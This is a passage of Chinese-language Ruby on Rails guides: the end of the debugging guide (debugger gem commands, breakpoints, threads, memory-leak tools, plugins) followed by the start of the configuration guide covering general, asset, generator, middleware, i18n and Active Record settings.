###  3.1 安装

debugger gem 可以设置断点，实时查看执行的 Rails 代码。安装方法如下：
$ gem install debugger

从 2.0 版本开始，Rails 内置了调试功能。在任何 Rails 程序中都可以使用 debugger 方法调出调试器。

下面举个例子：
class PeopleController < ApplicationController
  def new
    debugger
    @person = Person.new
  end
end

然后就能在控制台或者日志中看到如下信息：
***** Debugger requested, but was not available: Start server with --debugger to enable *****

记得启动服务器时要加上 --debugger 选项：
$ rails server --debugger
=> Booting WEBrick
=> Rails 4.2.0 application starting on http://0.0.0.0:3000
=> Debugger enabled
...

在开发环境中，如果启动服务器时没有指定 --debugger 选项，不用重启服务器，加入 require "debugger" 即可。
###  3.2 Shell

在程序中调用 debugger 方法后，会在启动程序所在的终端窗口中启用调试器 shell，并进入调试器的终端 (rdb:n) 中。其中 n 是线程编号。在调试器的终端中会显示接下来要执行哪行代码。

如果在浏览器中执行的请求触发了调试器，当前浏览器选项卡会处于停顿状态，等待调试器启动，跟踪完整个请求。

例如：
@posts = Post.all
(rdb:7)

现在可以深入分析程序的代码了。首先我们来查看一下调试器的帮助信息，输入 help：
(rdb:7) help
ruby-debug help v0.10.2
Type 'help <command-name>' for help on a specific command
 
Available commands:
backtrace  delete   enable  help    next  quit     show    trace
break      disable  eval    info    p     reload   source  undisplay
catch      display  exit    irb     pp    restart  step    up
condition  down     finish  list    ps    save     thread  var
continue   edit     frame   method  putl  set      tmate   where

要想查看某个命令的帮助信息，可以在终端里输入 help <command-name>，例如 help var。

接下来要学习最有用的命令之一：list。调试器中的命令可以使用简写形式，只要输入的字母数量足够和其他命令区分即可。因此，可使用 l 代替 list。

list 命令输出当前执行代码的前后 5 行代码。下面的例子中，当前行是第 6 行，前面用 => 符号标记。
(rdb:7) list
[1, 10] in /PathTo/project/app/controllers/posts_controller.rb
   1  class PostsController < ApplicationController
   2    # GET /posts
   3    # GET /posts.json
   4    def index
   5      debugger
=> 6      @posts = Post.all
   7
   8      respond_to do |format|
   9        format.html # index.html.erb
   10        format.json { render json: @posts }

如果再次执行 list 命令，请用 l 试试。接下来要执行的 10 行代码会显示出来：
(rdb:7) l
[11, 20] in /PathTo/project/app/controllers/posts_controller.rb
   11      end
   12    end
   13
   14    # GET /posts/1
   15    # GET /posts/1.json
   16    def show
   17      @post = Post.find(params[:id])
   18
   19      respond_to do |format|
   20        format.html # show.html.erb

可以一直这么执行下去，直到文件的末尾。如果到文件末尾了，list 命令会回到该文件的开头，再次从头开始执行一遍，把文件视为一个环形缓冲。

如果想查看前面 10 行代码，可以输入 list-（或者 l-）：
(rdb:7) l-
[1, 10] in /PathTo/project/app/controllers/posts_controller.rb
   1  class PostsController < ApplicationController
   2    # GET /posts
   3    # GET /posts.json
   4    def index
   5      debugger
   6      @posts = Post.all
   7
   8      respond_to do |format|
   9        format.html # index.html.erb
   10        format.json { render json: @posts }

使用 list 命令可以在文件中来回移动，查看 debugger 方法所在位置前后的代码。如果想知道 debugger 方法在文件的什么位置，可以输入 list=：
(rdb:7) list=
[1, 10] in /PathTo/project/app/controllers/posts_controller.rb
   1  class PostsController < ApplicationController
   2    # GET /posts
   3    # GET /posts.json
   4    def index
   5      debugger
=> 6      @posts = Post.all
   7
   8      respond_to do |format|
   9        format.html # index.html.erb
   10        format.json { render json: @posts }
###  3.3 上下文

开始调试程序时，会进入堆栈中不同部分对应的不同上下文。

到达一个停止点或者触发某个事件时，调试器就会创建一个上下文。上下文中包含被终止程序的信息，调试器用这些信息审查调用帧，计算变量的值，以及调试器在程序的什么地方终止执行。

任何时候都可执行 backtrace 命令（简写形式为 where）显示程序的调用堆栈。这有助于理解如何执行到当前位置。只要你想知道程序是怎么执行到当前代码的，就可以通过 backtrace 命令获得答案。
(rdb:5) where
    #0 PostsController.index
       at line /PathTo/project/app/controllers/posts_controller.rb:6
    #1 Kernel.send
       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175
    #2 ActionController::Base.perform_action_without_filters
       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175
    #3 ActionController::Filters::InstanceMethods.call_filters(chain#ActionController::Fil...,...)
       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/filters.rb:617
...

执行 frame n 命令可以进入指定的调用帧，其中 n 为帧序号。
(rdb:5) frame 2
#2 ActionController::Base.perform_action_without_filters
       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175

可用的变量和逐行执行代码时一样。毕竟，这就是调试的目的。

向前或向后移动调用帧可以执行 up [n]（简写形式为 u）和 down [n] 命令，分别向前或向后移动 n 帧。n 的默认值为 1。向前移动是指向更高的帧数移动，向下移动是指向更低的帧数移动。
###  3.4 线程

thread 命令（缩略形式为 th）可以列出所有线程，停止线程，恢复线程，或者在线程之间切换。其选项如下：

    thread：显示当前线程；
    thread list：列出所有线程及其状态，+ 符号和数字表示当前线程；
    thread stop n：停止线程 n；
    thread resume n：恢复线程 n；
    thread switch n：把当前线程切换到线程 n；

thread 命令有很多作用。调试并发线程时，如果想确认代码中没有条件竞争，使用这个命令十分方便。
###  3.5 审查变量

任何表达式都可在当前上下文中运行。如果想计算表达式的值，直接输入表达式即可。

下面这个例子说明如何查看在当前上下文中 instance_variables 的值：
@posts = Post.all
(rdb:11) instance_variables
["@_response", "@action_name", "@url", "@_session", "@_cookies", "@performed_render", "@_flash", "@template", "@_params", "@before_filter_chain_aborted", "@request_origin", "@_headers", "@performed_redirect", "@_request"]

你可能已经看出来了，在控制器中可使用的所有实例变量都显示出来了。这个列表随着代码的执行会动态更新。例如，使用 next 命令执行下一行代码：
(rdb:11) next
Processing PostsController#index (for 127.0.0.1 at 2008-09-04 19:51:34) [GET]
  Session ID: BAh7BiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7AA==--b16e91b992453a8cc201694d660147bba8b0fd0e
  Parameters: {"action"=>"index", "controller"=>"posts"}
/PathToProject/posts_controller.rb:8
respond_to do |format|

然后再查看 instance_variables 的值：
(rdb:11) instance_variables.include? "@posts"
true

实例变量中出现了 @posts，因为执行了定义这个变量的代码。

执行 irb 命令可进入 irb 模式，irb 会话使用当前上下文。警告：这是实验性功能。

var 命令是显示变量值最便捷的方式：
var
(rdb:1) v[ar] const <object>            show constants of object
(rdb:1) v[ar] g[lobal]                  show global variables
(rdb:1) v[ar] i[nstance] <object>       show instance variables of object
(rdb:1) v[ar] l[ocal]                   show local variables

上述方法可以很轻易的查看当前上下文中的变量值。例如：
(rdb:9) var local
  __dbg_verbose_save => false

审查对象的方法可以使用下述方式：
(rdb:9) var instance Post.new
@attributes = {"updated_at"=>nil, "body"=>nil, "title"=>nil, "published"=>nil, "created_at"...
@attributes_cache = {}
@new_record = true

命令 p（print，打印）和 pp(pretty print，精美格式化打印)可用来执行 Ruby 表达式并把结果显示在终端里。

display 命令可用来监视变量，查看在代码执行过程中变量值的变化：
(rdb:1) display @recent_comments
1: @recent_comments =

display 命令后跟的变量值会随着执行堆栈的推移而变化。如果想停止显示变量值，可以执行 undisplay n 命令，其中 n 是变量的代号，在上例中是 1。
###  3.6 逐步执行

现在你知道在运行代码的什么位置，以及如何查看变量的值。下面我们继续执行程序。

step 命令（缩写形式为 s）可以一直执行程序，直到下一个逻辑停止点，再把控制权交给调试器。

step+ n 和 step- n 可以相应的向前或向后 n 步。

next 命令的作用和 step 命令类似，但执行的方法不会停止。和 step 命令一样，也可使用加号前进 n 步。

next 命令和 step 命令的区别是，step 命令会在执行下一行代码之前停止，一次只执行一步；next 命令会执行下一行代码，但不跳出方法。

例如，下面这段代码调用了 debugger 方法：
class Author < ActiveRecord::Base
  has_one :editorial
  has_many :comments
 
  def find_recent_comments(limit = 10)
    debugger
    @recent_comments ||= comments.where("created_at > ?", 1.week.ago).limit(limit)
  end
end

在控制台中也可启用调试器，但要记得在调用 debugger 方法之前先 require "debugger"。
$ rails console
Loading development environment (Rails 4.2.0)
>> require "debugger"
=> []
>> author = Author.first
=> #<Author id: 1, first_name: "Bob", last_name: "Smith", created_at: "2008-07-31 12:46:10", updated_at: "2008-07-31 12:46:10">
>> author.find_recent_comments
/PathTo/project/app/models/author.rb:11
)

停止执行代码时，看一下输出：
(rdb:1) list
[2, 9] in /PathTo/project/app/models/author.rb
   2    has_one :editorial
   3    has_many :comments
   4
   5    def find_recent_comments(limit = 10)
   6      debugger
=> 7      @recent_comments ||= comments.where("created_at > ?", 1.week.ago).limit(limit)
   8    end
   9  end

在方法内的最后一行停止了。但是这行代码执行了吗？你可以审查一下实例变量。
(rdb:1) var instance
@attributes = {"updated_at"=>"2008-07-31 12:46:10", "id"=>"1", "first_name"=>"Bob", "las...
@attributes_cache = {}

@recent_comments 还未定义，所以这行代码还没执行。执行 next 命令执行这行代码：
(rdb:1) next
/PathTo/project/app/models/author.rb:12
@recent_comments
(rdb:1) var instance
@attributes = {"updated_at"=>"2008-07-31 12:46:10", "id"=>"1", "first_name"=>"Bob", "las...
@attributes_cache = {}
@comments = []
@recent_comments = []

现在看以看到，因为执行了这行代码，所以加载了 @comments 关联，也定义了 @recent_comments。

如果想深入方法和 Rails 代码执行堆栈，可以使用 step 命令，一步一步执行。这是发现代码问题（或者 Rails 框架问题）最好的方式。
###  3.7 断点

断点设置在何处终止执行代码。调试器会在断点设定行调用。

断点可以使用 break 命令（缩写形式为 b）动态添加。设置断点有三种方式：

    break line：在当前源码文件的第 line 行设置断点；
    break file:line [if expression]：在文件 file 的第 line 行设置断点。如果指定了表达式 expression，其返回结果必须为 true 才会启动调试器；
    break class(.|\#)method [if expression]：在 class 类的 method 方法中设置断点，. 和 \# 分别表示类和实例方法。表达式 expression 的作用和上个命令一样；

(rdb:5) break 10
Breakpoint 1 file /PathTo/project/vendor/rails/actionpack/lib/action_controller/filters.rb, line 10

info breakpoints n 或 info break n 命令可以列出断点。如果指定了数字 n，只会列出对应的断点，否则列出所有断点。
(rdb:5) info breakpoints
Num Enb What
  1 y   at filters.rb:10

如果想删除断点，可以执行 delete n 命令，删除编号为 n 的断点。如果不指定数字 n，则删除所有在用的断点。
(rdb:5) delete 1
(rdb:5) info breakpoints
No breakpoints.

启用和禁用断点的方法如下：

    enable breakpoints：允许使用指定的断点列表或者所有断点终止执行程序。这是创建断点后的默认状态。
    disable breakpoints：指定的断点 breakpoints 在程序中不起作用。

###  3.8 捕获异常

catch exception-name 命令（或 cat exception-name）可捕获 exception-name 类型的异常，源码很有可能没有处理这个异常。

执行 catch 命令可以列出所有可用的捕获点。
###  3.9 恢复执行

有两种方法可以恢复被调试器终止执行的程序：

    continue [line-specification]（或 c）：从停止的地方恢复执行程序，设置的断点失效。可选的参数 line-specification 指定一个代码行数，设定一个一次性断点，程序执行到这一行时，断点会被删除。
    finish [frame-number]（或 fin）：一直执行程序，直到指定的堆栈帧结束为止。如果没有指定 frame-number 参数，程序会一直执行，直到当前堆栈帧结束为止。当前堆栈帧就是最近刚使用过的帧，如果之前没有移动帧的位置（执行 up，down 或 frame 命令），就是第 0 帧。如果指定了帧数，则运行到指定的帧结束为止。

3.10 编辑

下面两种方法可以从调试器中使用编辑器打开源码：

    edit [file:line]：使用环境变量 EDITOR 指定的编辑器打开文件 file。还可指定文件的行数（line）。
    tmate n（简写形式为 tm）：在 TextMate 中打开当前文件。如果指定了参数 n，则使用第 n 帧。

3.11 退出

要想退出调试器，请执行 quit 命令（缩写形式为 q），或者别名 exit。

退出后会终止所有线程，所以服务器也会被停止，因此需要重启。
3.12 设置

debugger gem 能自动显示你正在分析的代码，在编辑器中修改代码后，还会重新加载源码。下面是可用的选项：

    set reload：修改代码后重新加载；
    set autolist：在每个断点处执行 list 命令；
    set listsize n：设置显示 n 行源码；
    set forcestep：强制 next 和 step 命令移到终点后的下一行；

执行 help set 命令可以查看完整说明。执行 help set subcommand 可以查看 subcommand 的帮助信息。

设置可以保存到家目录中的 .rdebugrc 文件中。启动调试器时会读取这个文件中的全局设置。

下面是 .rdebugrc 文件示例：
set autolist
set forcestep
set listsize 25
##  4 调试内存泄露

Ruby 程序（Rails 或其他）可能会导致内存泄露，泄露可能由 Ruby 代码引起，也可能由 C 代码引起。

本节介绍如何使用 Valgrind 等工具查找并修正内存泄露问题。
###  4.1 Valgrind

Valgrind 这个程序只能在 Linux 系统中使用，用于侦察 C 语言层的内存泄露和条件竞争。

Valgrind 提供了很多工具，可用来侦察内存管理和线程问题，也能详细分析程序。例如，如果 C 扩展调用了 malloc() 函数，但没调用 free() 函数，这部分内存就会一直被占用，直到程序结束。

关于如何安装 Valgrind 及在 Ruby 中使用，请阅读 Evan Weaver 编写的 Valgrind and Ruby 一文。
##  5 用于调试的插件

有很多 Rails 插件可以帮助你查找问题和调试程序。下面列出一些常用的调试插件：

    Footnotes：在程序的每个页面底部显示请求信息，并链接到 TextMate 中的源码；
    Query Trace：在日志中写入请求源信息；
    Query Reviewer：这个 Rails 插件在开发环境中会在每个 SELECT 查询前执行 EXPLAIN 查询，并在每个页面中添加一个 div 元素，显示分析到的查询问题；
    Exception Notifier：提供了一个邮件发送程序和一组默认的邮件模板，Rails 程序出现问题后发送邮件提醒；
    Better Errors：使用全新的页面替换 Rails 默认的错误页面，显示更多的上下文信息，例如源码和变量的值；
    RailsPanel：一个 Chrome 插件，在浏览器的开发者工具中显示 development.log 文件的内容，显示的内容包括：数据库查询时间，渲染时间，总时间，参数列表，渲染的视图等。

##  6 参考资源

    ruby-debug 首页
    debugger 首页
    文章：使用 ruby-debug 调试 Rails 程序
    Ryan Bates 制作的视频“Debugging Ruby (revised)”
    Ryan Bates 制作的视频“The Stack Trace”
    Ryan Bates 制作的视频“The Logger”
    使用 ruby-debug 调试

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  设置 Rails 程序

本文介绍 Rails 程序的设置和初始化。

读完本文，你将学到：

    如何调整 Rails 程序的表现；
    如何在程序启动时运行其他代码；

Chapters

    初始化代码的存放位置
    加载 Rails 前运行代码
    设置 Rails 组件
        3常规选项
        3设置静态资源
        3设置生成器
        3设置中间件
        3设置 i18n
        3设置 Active Record
        3设置 Action Controller
        3设置 Action Dispatch
        3设置 Action View
        3设置 Action Mailer
        3设置 Active Support
        3设置数据库
        3连接设置
        3新建 Rails 环境
        3部署到子目录中
    Rails 环境设置
    使用初始化脚本
    初始化事件
        3Rails::Railtie#initializer
        3初始化脚本
    数据库连接池

##  1 初始化代码的存放位置

Rails 的初始化代码存放在四个标准位置：

    config/application.rb 文件
    针对特定环境的设置文件；
    初始化脚本；
    后置初始化脚本；

##  2 加载 Rails 前运行代码

如果想在加载 Rails 之前运行代码，可以把代码添加到 config/application.rb 文件的 require 'rails/all' 之前。
##  3 设置 Rails 组件

总的来说，设置 Rails 的工作包括设置 Rails 的组件以及 Rails 本身。在设置文件 config/application.rb 和针对特定环境的设置文件（例如 config/environments/production.rb）中可以指定传给各个组件的不同设置项目。

例如，在文件 config/application.rb 中有下面这个设置：
config.autoload_paths += %W(#{config.root}/extras)

这是针对 Rails 本身的设置项目。如果想设置单独的 Rails 组件，一样可以在 config/application.rb 文件中使用同一个 config 对象：
config.active_record.schema_format = :ruby

Rails 会使用指定的设置配置 Active Record。
###  3.1 3常规选项

下面这些设置方法在 Rails::Railtie 对象上调用，例如 Rails::Engine 或 Rails::Application 的子类。

    config.after_initialize：接受一个代码块，在 Rails 初始化程序之后执行。初始化的过程包括框架本身，引擎，以及 config/initializers 文件夹中所有的初始化脚本。注意，Rake 任务也会执行代码块中的代码。常用于设置初始化脚本用到的值。

config.after_initialize do
  ActionView::Base.sanitized_allowed_tags.delete 'div'
end

    config.asset_host：设置静态资源的主机。可用于设置静态资源所用的 CDN，或者通过不同的域名绕过浏览器对并发请求数量的限制。是 config.action_controller.asset_host 的简化。

    config.autoload_once_paths：一个由路径组成的数组，Rails 从这些路径中自动加载常量，且在多次请求之间一直可用。只有 config.cache_classes 为 false（开发环境中的默认值）时才有效。如果为 true，所有自动加载的代码每次请求时都会重新加载。这个数组中的路径必须出现在 autoload_paths 设置中。默认为空数组。

    config.autoload_paths：一个由路径组成的数组，Rails 从这些路径中自动加载常量。默认值为 app 文件夹中的所有子文件夹。

    config.cache_classes：决定程序中的类和模块在每次请求中是否要重新加载。在开发环境中的默认值是 false，在测试环境和生产环境中的默认值是 true。调用 threadsafe! 方法的作用和设为 true 一样。

    config.action_view.cache_template_loading：决定模板是否要在每次请求时重新加载。默认值等于 config.cache_classes 的值。

    config.beginning_of_week：设置一周从哪天开始。可使用的值是一周七天名称的符号形式，例如 :monday。

    config.cache_store：设置 Rails 缓存的存储方式。可选值有：:memory_store，:file_store，:mem_cache_store，:null_store，以及实现了缓存 API 的对象。如果文件夹 tmp/cache 存在，默认值为 :file_store，否则为 :memory_store。

    config.colorize_logging：设定日志信息是否使用 ANSI 颜色代码。默认值为 true。

    config.consider_all_requests_local：如果设为 true，在 HTTP 响应中会显示详细的调试信息，而且 Rails::Info 控制器会在地址 /rails/info/properties 上显示程序的运行时上下文。在开发环境和测试环境中默认值为 true，在生产环境中默认值为 false。要想更精确的控制，可以把这个选项设为 false，然后在控制器中实现 local_request? 方法，指定哪些请求要显示调试信息。

    config.console：设置执行 rails console 命令时使用哪个类实现控制台，最好在 console 代码块中设置：

console do
  # this block is called only when running console,
  # so we can safely require pry here
  require "pry"
  config.console = Pry
end

    config.dependency_loading：设为 false 时禁止自动加载常量。只有 config.cache_classes 为 true（生产环境的默认值）时才有效。config.threadsafe! 为 true 时，这个选项为 false。

    config.eager_load：设为 true 是按需加载 config.eager_load_namespaces 中的所有命名空间，包括程序本身、引擎、Rails 框架和其他注册的命名空间。

    config.eager_load_namespaces：注册命名空间，config.eager_load 为 true 时按需加载。所有命名空间都要能响应 eager_load! 方法。

    config.eager_load_paths：一个由路径组成的数组，config.cache_classes 为 true 时，Rails 启动时按需加载对应的代码。

    config.encoding：设置程序全局编码，默认为 UTF-8。

    config.exceptions_app：设置抛出异常后中间件 ShowException 调用哪个异常处理程序。默认为 ActionDispatch::PublicExceptions.new(Rails.public_path)。

    config.file_watcher：设置监视文件系统上文件变化使用的类，config.reload_classes_only_on_change 为 true 时才有效。指定的类必须符合 ActiveSupport::FileUpdateChecker API。

    config.filter_parameters：过滤不想写入日志的参数，例如密码，信用卡卡号。把 config.filter_parameters+=[:password] 加入文件 config/initializers/filter_parameter_logging.rb，可以过滤密码。

    config.force_ssl：强制所有请求使用 HTTPS 协议，通过 ActionDispatch::SSL 中间件实现。

    config.log_formatter：设置 Rails 日志的格式化工具。在生产环境中默认值为 Logger::Formatter，其他环境默认值为 ActiveSupport::Logger::SimpleFormatter。

    config.log_level：设置 Rails 日志等级。在生产环境中默认值为 :info，其他环境默认值为 :debug。

    config.log_tags：一组可响应 request 对象的方法。可在日志消息中加入更多信息，例如二级域名和请求 ID，便于调试多用户程序。

    config.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类。默认值为 ActiveSupport::Logger，在生产环境中关闭了自动冲刷功能。

    config.middleware：设置程序使用的中间件。详情参阅“设置中间件”一节。

    config.reload_classes_only_on_change：只当监视的文件变化时才重新加载。默认值为 true，监视 autoload_paths 中所有路径。如果 config.cache_classes 为 true，忽略这个设置。

    secrets.secret_key_base： 指定一个密令，和已知的安全密令比对，防止篡改会话。新建程序时会生成一个随机密令，保存在文件 config/secrets.yml 中。

    config.serve_static_assets：让 Rails 伺服静态资源文件。默认值为 true，但在生产环境中为 false，因为应该使用服务器软件（例如 Nginx 或 Apache）伺服静态资源文件。 如果测试程序，或者在生产环境中使用 WEBrick（极力不推荐），应该设为 true，否则无法使用页面缓存，请求 public 文件夹中的文件时也会经由 Rails 处理。

    config.session_store：一般在 config/initializers/session_store.rb 文件中设置，指定使用什么方式存储会话。可用值有：:cookie_store（默认），:mem_cache_store 和 :disabled。:disabled 指明不让 Rails 处理会话。当然也可指定自定义的会话存储：

config.session_store :my_custom_store

这个自定义的存储方式必须定义为 ActionDispatch::Session::MyCustomStore。

    config.time_zone：设置程序使用的默认时区，也让 Active Record 使用这个时区。

###  3.2 3设置静态资源

    config.assets.enabled：设置是否启用 Asset Pipeline。默认启用。

    config.assets.raise_runtime_errors：设为 true，启用额外的运行时错误检查。建议在 config/environments/development.rb 中设置，这样可以尽量减少部署到生产环境后的异常表现。

    config.assets.compress：是否压缩编译后的静态资源文件。在 config/environments/production.rb 中为 true。

    config.assets.css_compressor：设定使用的 CSS 压缩程序，默认为 sass-rails。目前，唯一可用的另一个值是 :yui，使用 yui-compressor gem 压缩文件。

    config.assets.js_compressor：设定使用的 JavaScript 压缩程序。可用值有：:closure，:uglifier 和 :yui。分别需要安装 closure-compiler，uglifier 和 yui-compressor 这三个 gem。

    config.assets.paths：查找静态资源文件的路径。Rails 会在这个选项添加的路径中查找静态资源文件。

    config.assets.precompile：指定执行 rake assets:precompile 任务时除 application.css 和 application.js 之外要编译的其他资源文件。

    config.assets.prefix：指定伺服静态资源文件时使用的地址前缀，默认为 /assets。

    config.assets.digest：在静态资源文件名中加入 MD5 指纹。在 production.rb 中默认设为 true。

    config.assets.debug：禁止合并和压缩静态资源文件。在 development.rb 中默认设为 true。

    config.assets.cache_store：设置 Sprockets 使用的缓存方式，默认使用文件存储。

    config.assets.version：生成 MD5 哈希时用到的一个字符串。可用来强制重新编译所有文件。

    config.assets.compile：布尔值，用于在生产环境中启用 Sprockets 实时编译功能。

    config.assets.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类。默认值等于 config.logger 选项的值。把 config.assets.logger 设为 false，可以关闭静态资源相关的日志。

###  3.3 3设置生成器

Rails 允许使用 config.generators 方法设置使用的生成器。这个方法接受一个代码块：
config.generators do |g|
  g.orm :active_record
  g.test_framework :test_unit
end

在代码块中可用的方法如下所示：

    assets：是否允许脚手架创建静态资源文件，默认为 true。
    force_plural：是否允许使用复数形式的模型名，默认为 false。
    helper：是否生成帮助方法文件，默认为 true。
    integration_tool：设置使用哪个集成工具，默认为 nil。
    javascripts：是否允许脚手架创建 JavaScript 文件，默认为 true。
    javascript_engine：设置生成静态资源文件时使用的预处理引擎（例如 CoffeeScript），默认为 nil。
    orm：设置使用哪个 ORM。默认为 false，使用 Active Record。
    resource_controller：设定执行 rails generate resource 命令时使用哪个生成器生成控制器，默认为 :controller。
    scaffold_controller：和 resource_controller 不同，设定执行 rails generate scaffold 命令时使用哪个生成器生成控制器，默认为 :scaffold_controller。
    stylesheets：是否启用生成器中的样式表文件钩子，在执行脚手架时使用，也可用于其他生成器，默认值为 true。
    stylesheet_engine：设置生成静态资源文件时使用的预处理引擎（例如 Sass），默认为 :css。
    test_framework：设置使用哪个测试框架，默认为 false，使用 Test::Unit。
    template_engine：设置使用哪个模板引擎，例如 ERB 或 Haml，默认为 :erb。

###  3.4 3设置中间件

每个 Rails 程序都使用了一组标准的中间件，在开发环境中的加载顺序如下：

    ActionDispatch::SSL：强制使用 HTTPS 协议处理每个请求。config.force_ssl 设为 true 时才可用。config.ssl_options 选项的值会传给这个中间件。
    ActionDispatch::Static：用来伺服静态资源文件。如果 config.serve_static_assets 设为 false，则不会使用这个中间件。
    Rack::Lock：把程序放入互斥锁中，一次只能在一个线程中运行。config.cache_classes 设为 false 时才会使用这个中间件。
    ActiveSupport::Cache::Strategy::LocalCache：使用内存存储缓存。这种存储方式对线程不安全，而且只能在单个线程中做临时存储。
    Rack::Runtime：设定 X-Runtime 报头，其值为处理请求花费的时间，单位为秒。
    Rails::Rack::Logger：开始处理请求时写入日志，请求处理完成后冲刷所有日志。
    ActionDispatch::ShowExceptions：捕获程序抛出的异常，如果在本地处理请求，或者 config.consider_all_requests_local 设为 true，会渲染一个精美的异常页面。如果 config.action_dispatch.show_exceptions 设为 false，则会直接抛出异常。
    ActionDispatch::RequestId：在响应中加入一个唯一的 X-Request-Id 报头，并启用 ActionDispatch::Request#uuid 方法。
    ActionDispatch::RemoteIp：从请求报头中获取正确的 client_ip，检测 IP 地址欺骗攻击。通过 config.action_dispatch.ip_spoofing_check 和 config.action_dispatch.trusted_proxies 设置。
    Rack::Sendfile：响应主体为一个文件，并设置 X-Sendfile 报头。通过 config.action_dispatch.x_sendfile_header 设置。
    ActionDispatch::Callbacks：处理请求之前运行指定的回调。
    ActiveRecord::ConnectionAdapters::ConnectionManagement：每次请求后都清理可用的连接，除非把在请求环境变量中把 rack.test 键设为 true。
    ActiveRecord::QueryCache：缓存请求中使用的 SELECT 查询。如果用到了 INSERT 或 UPDATE 语句，则清除缓存。
    ActionDispatch::Cookies：设置请求的 cookie。
    ActionDispatch::Session::CookieStore：把会话存储在 cookie 中。config.action_controller.session_store 设为其他值时则使用其他中间件。config.action_controller.session_options 的值会传给这个中间件。
    ActionDispatch::Flash：设定 flash 键。必须为 config.action_controller.session_store 设置一个值，才能使用这个中间件。
    ActionDispatch::ParamsParser：解析请求中的参数，生成 params。
    Rack::MethodOverride：如果设置了 params[:_method]，则使用相应的方法作为此次请求的方法。这个中间件提供了对 PATCH、PUT 和 DELETE 三个 HTTP 请求方法的支持。
    ActionDispatch::Head：把 HEAD 请求转换成 GET 请求，并处理请求。

除了上述标准中间件之外，还可使用 config.middleware.use 方法添加其他中间件：
config.middleware.use Magical::Unicorns

上述代码会把中间件 Magical::Unicorns 放入中间件列表的最后。如果想在某个中间件之前插入中间件，可以使用 insert_before：
config.middleware.insert_before ActionDispatch::Head, Magical::Unicorns

如果想在某个中间件之后插入中间件，可以使用 insert_after：
config.middleware.insert_after ActionDispatch::Head, Magical::Unicorns

中间件还可替换成其他中间件：
config.middleware.swap ActionController::Failsafe, Lifo::Failsafe

也可从中间件列表中删除：
config.middleware.delete "Rack::MethodOverride"
###  3.5 3设置 i18n

下述设置项目都针对 I18n 代码库。

    config.i18n.available_locales：设置程序可用本地语言的白名单。默认值为可在本地化文件中找到的所有本地语言，在新建程序中一般是 :en。

    config.i18n.default_locale：设置程序的默认本地化语言，默认值为 :en。

    config.i18n.enforce_available_locales：确保传给 i18n 的本地语言在 available_locales 列表中，否则抛出 I18n::InvalidLocale 异常。默认值为 true。除非特别需要，不建议禁用这个选项，因为这是一项安全措施，能防止用户提供不可用的本地语言。

    config.i18n.load_path：设置 Rails 搜寻本地化文件的路径。默认为 config/locales/*.{yml,rb}`。

###  3.6 3设置 Active Record

config.active_record 包含很多设置项：

    config.active_record.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类，然后传给新建的数据库连接。在 Active Record 模型类或模型实例上调用 logger 方法可以获取这个日志类。设为 nil 禁用日志。

    config.active_record.primary_key_prefix_type：调整主键的命名方式。默认情况下，Rails 把主键命名为 id（无需设置这个选项）。除此之外还有另外两个选择：
        :table_name：Customer 模型的主键为 customerid；
        :table_name_with_underscore： Customer 模型的主键为 customer_id；

    config.active_record.table_name_prefix：设置一个全局字符串，作为数据表名的前缀。如果设为 northwest_，那么 Customer 模型对应的表名为 northwest_customers。默认为空字符串。

    config.active_record.table_name_suffix：设置一个全局字符串，作为数据表名的后缀。如果设为 _northwest，那么 Customer 模型对应的表名为 customers_northwest。默认为空字符串。

    config.active_record.schema_migrations_table_name：设置模式迁移数据表的表名。

    config.active_record.pluralize_table_names：设置 Rails 在数据库中要寻找单数形式还是复数形式的数据表。如果设为 true（默认值），Customer 类对应的数据表是 customers。如果设为 false，Customer 类对应的数据表是 customer。

    config.active_record.default_timezone：从数据库中查询日期和时间时使用 Time.local（设为 :local 时）还是 Time.utc（设为 :utc 时）。默认为 :utc。

    config.active_record.schema_format：设置导出数据库模式到文件时使用的格式。可选项包括：:ruby，默认值，根据迁移导出模式，与数据库种类无关；:sql，导出为 SQL 语句，受数据库种类影响。

    config.active_record.timestamped_migrations：设置迁移编号使用连续的数字还是时间戳。默认值为 true，使用时间戳。如果有多名开发者协作，建议使用时间戳。

    config.active_record.lock_optimistically：设置 Active Record 是否使用乐观锁定，默认使用。

    config.active_record.cache_timestamp_format：设置缓存键中使用的时间戳格式，默认为 :number。

    config.active_record.record_timestamps：设置是否记录 create 和 update 动作的时间戳。默认为 true。

    config.active_record.partial_writes： 布尔值，设置是否局部写入（例如，只更新有变化的属性）。注意，如果使用局部写入，还要使用乐观锁定，因为并发更新写入的数据可能已经过期。默认值为 true。

    config.active_record.attribute_types_cached_by_default：设置读取时 ActiveRecord::AttributeMethods 缓存的字段类型。默认值为 [:datetime, :timestamp, :time, :date]。

    config.active_record.maintain_test_schema：设置运行测试时 Active Record 是否要保持测试数据库的模式和 db/schema.rb 文件（或 db/structure.sql）一致，默认为 true。

    config.active_record.dump_schema_after_migration：设置运行迁移后是否要导出数据库模式到文件 db/schema.rb 或 db/structure.sql 中。这项设置在 Rails 生成的 config/environments/production.rb 文件中为 false。如果不设置这个选项，则值为 true。

MySQL 适配器添加了一项额外设置：

    ActiveRecord::ConnectionAdapters::MysqlAdapter.emulate_booleans：设置 Active Record 是否要把 MySQL 数据库中 tinyint(1) 类型的字段视为布尔值，默认为 true。

模式导出程序添加了一项额外设置：

    ActiveRecord::SchemaDumper.ignore_tables：指定一个由数据表组成的数组，导出模式时不会出现在模式文件中。仅当 config.active_record.schema_format == :ruby 时才有效。

